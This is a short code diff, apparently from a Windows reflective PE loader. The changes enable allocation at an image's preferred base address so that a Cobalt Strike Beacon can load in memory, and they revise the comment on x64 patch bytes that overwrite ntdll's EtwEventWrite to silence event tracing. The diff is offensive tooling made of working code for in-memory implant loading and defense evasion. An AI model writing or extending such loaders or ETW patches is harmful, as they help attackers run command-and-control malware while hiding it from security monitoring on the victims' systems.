@@ -218,6 +218,7 @@ void wideToNarrowStr(LPWSTR lpwszStr, LPSTR* ppszStr) {
 }
 
 // --- WARNING THIS IS GARBAGE CODE (c string manipulation + wide to narrow string conversion is a nightmare) ---
+// note: host process PEB is shared by reflectively loaded PE
 // visual studio cl.exe compile uses __p___argc and __p___argv to retrieve commandline
 char*** __p___argvHook() {
 	// using GetCommandLineW because win32 has not implemented a CommandLineToArgvA function 
@@ -487,8 +488,8 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	//((NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
 
 	// try to alloc memory for image at preferred address 
-	//LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	LPVOID peImageBase = NULL;
+	// note: CobaltStrike Beacon will not work if it is not loaded at its preferred load address
+	LPVOID peImageBase = VirtualAlloc(preferredAddr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 	// if allocation not possible at preferred address, allocate anywhere
 	if (!peImageBase) {
@@ -846,7 +847,7 @@ DWORD patchETW(bool is32Bit = true) {
 		patchBytes = (void*)"\xc2\x14\x00\x00"; 
 		patchSize = 4;
 	} else { 
-		// !need to reverse x64 version of EtwEventWrite to get proper return instructions!
+		// reversed x64 version of ntdll.dll::EtwEventWrite return
 		patchBytes = (void*)"\xc3"; // untested
 		patchSize = 1;
 	}
